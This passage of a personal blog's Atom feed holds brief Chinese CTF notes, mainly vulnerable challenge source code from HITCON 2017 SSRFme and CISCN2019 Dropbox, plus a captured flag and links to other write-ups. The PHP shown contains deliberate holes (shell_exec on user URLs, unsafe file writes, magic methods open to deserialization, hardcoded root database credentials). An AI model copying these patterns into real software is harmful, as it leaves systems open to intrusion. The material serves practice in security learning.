&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/m0_62107966/article</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CISCN2019 总决赛 Day2 Web1]Easyweb</title>
    <link href="http://van0308.github.io/2023/02/14/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb/"/>
    <id>http://van0308.github.io/2023/02/14/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb/</id>
    <published>2023-02-14T07:07:11.000Z</published>
    <updated>2023-02-14T07:12:11.514Z</updated>
    
    <content type="html"><![CDATA[<p>无语，第一次就得将文件名搞好，</p><p>访问才会出现User admin uploaded file</p><p>再发一次就</p><p>User admin uploaded file flag{6311ea83-93c7-4f7c-a52b-d884adc7b77d} flag{6311ea83-93c7-4f7c-a52b-d884adc7b77d}. User admin uploaded file flag{6311ea83-93c7-4f7c-a52b-d884adc7b77d} flag{6311ea83-93c7-4f7c-a52b-d884adc7b77d}.</p><p><a href="https://www.cnblogs.com/wkzb/p/12562379.html">https://www.cnblogs.com/wkzb/p/12562379.html</a> 另类解法</p><p><a href="https://www.jianshu.com/p/e0e59ed2d6d2">https://www.jianshu.com/p/e0e59ed2d6d2</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;无语，第一次就得将文件名搞好，&lt;/p&gt;
&lt;p&gt;访问才会出现User admin uploaded file&lt;/p&gt;
&lt;p&gt;再发一次就&lt;/p&gt;
&lt;p&gt;User admin uploaded file flag{6311ea83-93c7-4f7c-a52b-d884adc7b</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[HITCON 2017]SSRFme</title>
    <link href="http://van0308.github.io/2023/02/13/HITCON-2017-SSRFme/"/>
    <id>http://van0308.github.io/2023/02/13/HITCON-2017-SSRFme/</id>
    <published>2023-02-13T14:49:41.000Z</published>
    <updated>2023-02-13T14:50:21.894Z</updated>
    
    <content type="html"><![CDATA[<p>打开就是源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$http_x_headers</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">        <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$http_x_headers</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&quot;sandbox/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;GET &quot;</span> . <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]));</span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line">    <span class="variable">$dir</span>  = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;dirname&quot;</span>]));</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">    @<span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;basename&quot;</span>]), <span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;打开就是源码&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br</summary>
      
    
    
    
    
    <category term="-buu" scheme="http://van0308.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>hgame2023</title>
    <link href="http://van0308.github.io/2023/02/13/hgame2023/"/>
    <id>http://van0308.github.io/2023/02/13/hgame2023/</id>
    <published>2023-02-13T02:57:10.000Z</published>
    <updated>2023-02-13T09:23:00.241Z</updated>
    
    <content type="html"><![CDATA[<h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>js,</p><p>在联想浏览器和火狐第二种老是不行，在edge第二种可以。先打断点后操纵人物去对话，然后修改id，再运行，发现属性会增加</p><p>Become A Member</p><p>携带请求body不⼀定要指定POST的请求⽅式</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;week1&quot;&gt;&lt;a href=&quot;#week1&quot; class=&quot;headerlink&quot; title=&quot;week1&quot;&gt;&lt;/a&gt;week1&lt;/h1&gt;&lt;h2 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[RootersCTF2019]I_&lt;3_Flask</title>
    <link href="http://van0308.github.io/2023/02/11/RootersCTF2019-I-3-Flask/"/>
    <id>http://van0308.github.io/2023/02/11/RootersCTF2019-I-3-Flask/</id>
    <published>2023-02-11T11:16:11.000Z</published>
    <updated>2023-02-11T13:34:09.477Z</updated>
    
    <content type="html"><![CDATA[<p>flask</p><p>没有过滤</p><p>查参数</p><p><img src="C:\Users\wen\AppData\Roaming\Typora\typora-user-images\image-20230211195533349.png" alt="image-20230211195533349"></p><p><a href="https://blog.csdn.net/qq_44657899/article/details/119726513">https://blog.csdn.net/qq_44657899/article/details/119726513</a></p><p><a href="https://blog.csdn.net/m0_62905261/article/details/125947743">https://blog.csdn.net/m0_62905261/article/details/125947743</a></p><p><a href="https://blog.csdn.net/fmyyy1/article/details/115715212">https://blog.csdn.net/fmyyy1/article/details/115715212</a></p><p><a href="https://blog.csdn.net/Mrs_H/article/details/121411149">https://blog.csdn.net/Mrs_H/article/details/121411149</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;flask&lt;/p&gt;
&lt;p&gt;没有过滤&lt;/p&gt;
&lt;p&gt;查参数&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;C:\Users\wen\AppData\Roaming\Typora\typora-user-images\image-20230211195533349.png&quot; alt=&quot;im</summary>
      
    
    
    
    
    <category term="-buu" scheme="http://van0308.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>[CISCN2019 华北赛区 Day1 Web1]Dropbox</title>
    <link href="http://van0308.github.io/2023/02/11/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/"/>
    <id>http://van0308.github.io/2023/02/11/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/</id>
    <published>2023-02-11T08:57:54.000Z</published>
    <updated>2023-02-13T14:02:20.411Z</updated>
    
    <content type="html"><![CDATA[<p>做题</p><p>登录页面，尝试注册，然后登录，发现可以上传文件，先上传正常的，发现可以下载和删除，</p><p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#x27;login&#x27;])) &#123;</span><br><span class="line">    header(&quot;Location: login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;</span><br><span class="line">&lt;title&gt;网盘管理&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;link href=&quot;static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">    &lt;link href=&quot;static/css/panel.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">    &lt;script src=&quot;static/js/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;static/js/toast.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;static/js/panel.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;nav aria-label=&quot;breadcrumb&quot;&gt;</span><br><span class="line">    &lt;ol class=&quot;breadcrumb&quot;&gt;</span><br><span class="line">        &lt;li class=&quot;breadcrumb-item active&quot;&gt;管理面板&lt;/li&gt;</span><br><span class="line">        &lt;li class=&quot;breadcrumb-item active&quot;&gt;&lt;label for=&quot;fileInput&quot; class=&quot;fileLabel&quot;&gt;上传文件&lt;/label&gt;&lt;/li&gt;</span><br><span class="line">        &lt;li class=&quot;active ml-auto&quot;&gt;&lt;a href=&quot;#&quot;&gt;你好 &lt;?php echo $_SESSION[&#x27;username&#x27;]?&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;/ol&gt;</span><br><span class="line">&lt;/nav&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; id=&quot;fileInput&quot; class=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;div class=&quot;top&quot; id=&quot;toast-container&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include &quot;class.php&quot;;</span><br><span class="line"></span><br><span class="line">$a = new FileList($_SESSION[&#x27;sandbox&#x27;]);</span><br><span class="line">$a-&gt;Name();</span><br><span class="line">$a-&gt;Size();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> 